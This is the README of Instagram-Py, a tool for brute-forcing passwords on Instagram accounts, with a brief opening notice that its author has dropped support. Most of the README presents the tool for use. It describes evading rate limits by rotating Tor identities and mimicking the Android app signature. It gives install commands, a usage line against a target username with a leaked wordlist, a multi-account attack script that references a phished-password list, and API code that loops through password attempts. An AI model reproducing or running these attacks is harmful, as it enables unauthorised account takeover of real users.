-----------------------------------------------------------------------------------------------------------------------------
Instagram-Py support is dropped , I just don't want to abuse the tor project anymore and tools that hack any social media is bad. Also , I don't want to spend my time on something which will hurt others.( victims ). Sorry everyone! 😭😭😭
-----------------------------------------------------------------------------------------------------------------------------



.. image:: https://raw.githubusercontent.com/antony-jr/instagram-py/master/.img/poster.png



.. raw:: html
 
 <blockquote>:briefcase: The Official Instagram-Py repo. A professional tool to :8ball: brute force instagram :camera_flash: accounts with less resource :gift: as possible , Written in Python :snake: and made with :heart: -- Antony Jr.</blockquote>
    
 
 <h1 align="center" > Instagram-Py </h1>

 <p align=center>
 <a href="https://travis-ci.org/antony-jr/instagram-py">
 <img src="https://travis-ci.org/antony-jr/instagram-py.svg?branch=master" / >
 </a>

 <a href="https://github.com/antony-jr/instagram-py/issues">
 <img src="https://img.shields.io/github/issues/antony-jr/instagram-py.svg?style=flat-square" / >
 </a>
 
 <a href="https://github.com/antony-jr/instagram-py/network">
 <img src="https://img.shields.io/github/forks/antony-jr/instagram-py.svg?style=flat-square" / >
 </a>
 
 <a href="https://github.com/antony-jr/instagram-py/stargazers">
 <img src="https://img.shields.io/github/stars/antony-jr/instagram-py.svg?style=flat-square" / >
 </a>
 
 <a href="https://github.com/antony-jr/instagram-py/blob/master/LICENSE">
 <img src="https://img.shields.io/github/license/antony-jr/instagram-py.svg?style=flat-square" / >
 </a>
 
 <a class="badge-align" href="https://www.codacy.com/app/antony-jr/instagram-py?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=antony-jr/instagram-py&amp;utm_campaign=Badge_Grade"><img src="https://api.codacy.com/project/badge/Grade/352d5096b26e46faaa6b7434ad5afed6"/></a>
 
 </p>

  
  
| This project was started as a **POC** and then evolved into something. I first started this project when a lot of people
| started asking about brute forcing instagram and so I started working on a **Proof-Of-Concept** for brute forcing instagram
| without any password (try) limiting. Another reason to start working on this project was that there was no good tool to do
| this job , Yep! even now if you search through github you cannot find a tool which is good as instagram-py. Since a few people
| liked this tool , I decided to give it a **LTS**. Still there exists some old versions of instagram-py all-over github but
| **this is the official repo**. You can also use **different versions** of **instagram-py** through **pip**. 
|

|
| **Important Note**: You need to understand that **brute force** attacks are not always successful ( or mostly unsuccessful )
| if you use a generic wordlist that is not related to the target and so the attack will be useless,Make sure you use your tries
| carefully. **Please see that I am not a paid hacker and doing so is also illegal** and so please don't contact in the hope to
| get some help. Since I can't help you because I am not that really **skilled** in this stuff myself. 


|
| **Disclaimer**: This tool was created only for a small experiment and to study how brute force attacks work. You are free to
| use this tool with respect to the **MIT License** , and as the license states, the author has nothing to do with the any
| damage caused by this tool , The users are the only one who is responsible ( But I hope you won't do anything serious ).

.. raw:: html

 <br>
 <p align=center>
 <table>
 <tr>
 <th>DOWNLOAD</th>
 <th>INSTALL</th>
 </tr>
 <tr>
 <td>
 <a href="https://github.com/antony-jr/instagram-py/releases/download/continuous/Instagram-Py-continuous-x86_64.AppImage">
 <img src="https://img.shields.io/badge/LINUX_DOWNLOAD-InSTAGRAM--PY%20PORTABLE%20x86__64-brightgreen.svg?style=for-the-badge" />
 </a>
 </td>
 <td>
 <pre>
 $ chmod +x Instagram-Py-continuous-x86_64.AppImage;
 $ ./Instagram-Py-continuous-x86_64.AppImage # Just Use!
 </pre>
 </td>
 </tr>
 </table>
 <br>
 <img src="https://raw.githubusercontent.com/antony-jr/instagram-py/master/.img/preview.gif" / >
 </p>



------
 How?
------

| We use , **tor** to change our ip once blocked for many tries and continue attack.
| Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**
| And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!


-------
 What?
-------

| **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   
| this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.
| Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible
| This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,
| but if your **tor** installation is **misconfigured** then the blame is on you.


------------
 Features
------------

* Ultra Portable

  As of Instagram-Py v2.0.6 , Instagram-Py is also distributed in **AppImages** , If you use
  Instagram-Py bundled in a AppImage , **You do not need to install anything , even tor.**
  Just **download** , **mark it executable** and **enjoy**! 
  Now Instagram-Py is the only (*The best of my knowledge*) hacking tool which is ultra portable that you
  can carry in a thumb drive. ( And use it in **any Linux Distro without installing anything**).
  know more in the installation section.

* Instagram-Py Scripting

  Craft your own python script which will embed into Instagram-Py for Maximum Customization of your
  brute force attack , example: What if you want a message sent to your phone when an account is hacked?

* Resumes Attacks when the same wordlist is used on the same Username
* Dumps successfully cracked accounts.
* Maximum Customization! ( This includes multiple attack vectors! )
* Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )
* Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )


**Depends on**: python3 , tor ,  requests , requests[socks] , stem (*Don't need anything if you use Instagram-Py Portable*)

==============
 Installation
==============

------------------------------------------------------------
Get Instagram-Py with Zero Setup ( Instagram-Py Portable )
------------------------------------------------------------


Just **execute** this **single command** and you will have everything to start using
**Instagram-Py** right-away!
**This Method is only possible for Linux Distro's with 64Bit Architecture** (*Any Linux Distro which is 64 Bit*).
**If you use this method...**

* You **don't** need to install anything in your **linux distro**.
* You **don't** even need **python** and **tor server** installed.
* You **don't** need any type of **configuration**. (*It Just Works!*)


::

 $ sudo wget -O /usr/bin/instagram-py https://git.io/vxKaq; sudo chmod +x /usr/bin/instagram-py
 $ instagram-py # Installed , Easy right ?



**Caution**: Please don't mix up this installation and pip installation as it may give unexpected
output.

You can also download **instagram-py** directly from the release page and save it in a thumb drive
to use it later, Cool right ?


---------------------------------
 Upgrading Instagram-Py with pip
---------------------------------

::

 $ sudo pip3 install instagram-py --upgrade


-------------------------------
 using pip to get Instagram-py
-------------------------------

**Make sure you have got the latest version of pip(>= 9.0 and python(>= 3.6)**

::

 $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip
 $ sudo pip3 install requests --upgrade
 $ sudo pip3 install requests[socks]
 $ sudo pip3 install stem
 $ sudo pip3 install instagram-py
 $ instagram-py # installed successfully
 $ # Configuration is Super Important so Lets Create One
 $ instagram-py --create-configuration # follow the steps... 

--------------------------------
    Configuring Instagram-Py
--------------------------------

**As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**

::

 $ instagram-py --create-configuration
 $      # OR
 $ instagram-py -cc



**Or if you just want the default settings without the annoying questions then**

::

 $ instagram-py --create-configuration --default-configuration
 $      # OR
 $ instagram-py -cc -dc



--------------------------------------------------
    Configuring Tor server to open control port
--------------------------------------------------

open your **tor configuration** file usually located at **/etc/tor/torrc**


::
 
 $ sudo vim /etc/tor/torrc # open it with your text editor
 

**search** for the file for this **specific section**

::

 ## The port on which Tor will listen for local connections from Tor
 ## controller applications, as documented in control-spec.txt.
 #ControlPort 9051
 
**uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**

**now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** 

=============
    Usage
=============

**Finally** , now you can use instagram-py!

**Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**

**Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**


::

 $ instagram-py -u your_account_username -pl path_to_password_list


**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**

::

 usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]
                     [--script SCRIPT] [--inspect-username INSPECT_USERNAME]
                     [--create-configuration] [--default-configuration]
                     [--countinue] [--verbose]
 
 optional arguments:
   -h, --help            show this help message and exit
   --username USERNAME, -u USERNAME
                         username for Instagram account
   --password-list PASSWORD_LIST, -pl PASSWORD_LIST
                         password list file to try with the given username.
   --script SCRIPT, -s SCRIPT
                         Instagram-Py Attack Script.
   --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME
                         Username to inspect in the instagram-py dump.
   --create-configuration, -cc
                         Create a Configuration file for Instagram-Py with
                         ease.
   --default-configuration, -dc
                         noconfirm for Instagram-Py Configuration Creator!
   --continue-attack, -c       Continue the previous attack if found.
   --verbose, -v         Activate Verbose mode. ( Verbose level )

 example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt

 Report bug, suggestions and new features at https://github.com/antony-jr/instagram-py



========================
 Instagram-Py Scripting
========================

Instagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.
This Scripts are simple Python Scripts ( You Can just do anything that is possible with python )

**Witness the power of Instagram-Py Scripting**

::

 #!/usr/bin/instagram-py -s
 # Only Supports Python 3

 import os

 def hacked_an_account(username , password):
    # Use Twilio API to Make a Message to our phone MayBe?
    print("Account Cracked!")
    return True


 print("Initiating Multi Username Attack Script...")

 global_callback = hacked_an_account
 global_password_list = "{}/.exploits/facebook-phished.txt".format(os.path.expanduser('~'))

 usernames = [ # Reserved Variable
   {
   "id" : "instatestgod__",
   "password_list" : "/home/antonyjr/Developer/.exploits/rockyou.txt" , # full path
   "continue" : True, # Optional
   "verbose" : 0 # Optional
    },
   # If you want to simultaniously attack the same account with different wordlist
   # Apparently Saving does not work here if two wordlist are used on a single user!
   # could be later fixed anyways...
   {
   "id" : "instatestgod__",
   # global password list will cover us if password list is not mentioned!
   "continue" : False, # Optional
   "verbose" : 3 # Optional
   }
   # ,
   # {
   # "id" : "even_more_users",
   # "password_list" : "different_passwords.lst",
   # }
 ]



**You Can Always View the Cracked Passwords Using this command!**

::

 $ instagram-py -i instatestgod__
 $ # Displays record if it is cracked in the past!

===========================
 Using Instagram-Py as API
===========================

**Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**

For some reason you wish not to use my software then you can use my software as a module and embed into your own
software , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.

**Follow the same installation method mentioned above to install Instagram-Py API.**

This is a simple script to conduct a bructe force attack using instagram-py as a API.

::

 #!/usr/bin/env python3
 '''
   This is the same thing that is in the __init__ file of the command-line
   tool.
 '''
 from InstagramPy.InstagramPyCLI import InstagramPyCLI
 from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH
 from InstagramPy.InstagramPyInstance import InstagramPyInstance
 from datetime import datetime
 
 username = "TARGET ACCOUNT USERNAME"
 password = "PASSWORD LIST PATH"

 appInfo = {
    "version"     : "0.0.1",
    "name"        : "Instagram-Py Clone",
    "description" : "Some Module to crack instagram!",
    "author"      : "YourName",
    "company"     : "YourCompany",
    "year"        : "2017",
    "example"     : ""
 }

 cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)
 
 '''
 # USE THIS IF YOU WANT
 cli.PrintHeader()
 cli.PrintDatetime()
 '''
 session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
 session.ReadSaveFile(True) # True to countinue attack if found save file.
 '''
 # USE THIS IF YOU WANT
 cli.PrintMagicCookie(session.magic_cookie)
 '''

 '''
  Defining @param cli = None will make Instagram-Py run silently so you
  can you use your own interface if you like.
  or if you want to use the official interface then declare like this

  instagrampy = InstagramPyInstance(cli = cli , session = session)

 '''

 instagrampy = InstagramPyInstance(cli = None ,session = session)
 while not instagrampy.PasswordFound():
        print('Trying... '+session.CurrentPassword())
        instagrampy.TryPassword()

 if instagrampy.PasswordFound():
        print('Password Found: '+session.CurrentPassword())

 exit(0) 
 


=========
Support
=========

If you think that this project is **cool** then you can give it a :star: or :fork_and_knife: it if you want to improve it with me. I really :heart: stars though!   

.. raw:: html

 <p align="center">
     <a href="https://liberapay.com/antonyjr/donate">
        <img src="https://liberapay.com/assets/widgets/donate.svg">
     </a>
 </p>


If you want to do something that stands out then you can click the **donate** button at the top to make a monthly donation , So   
I will make sure that I stay healthy and keep on to do my work. :briefcase: Supporting me means supporting all of my projects , So   
you are like **Tony Stark** :heart: who backs **Spider-Man**! Thank you for your extra care! :dog:   

You can also tweet about me on twitter , get connected with me here -> https://twitter.com/antonyjr0

Thank You! :smiley_cat:



=============
   License
=============

The MIT License,

Copyright (C) 2018 The Future Shell , Antony Jr.
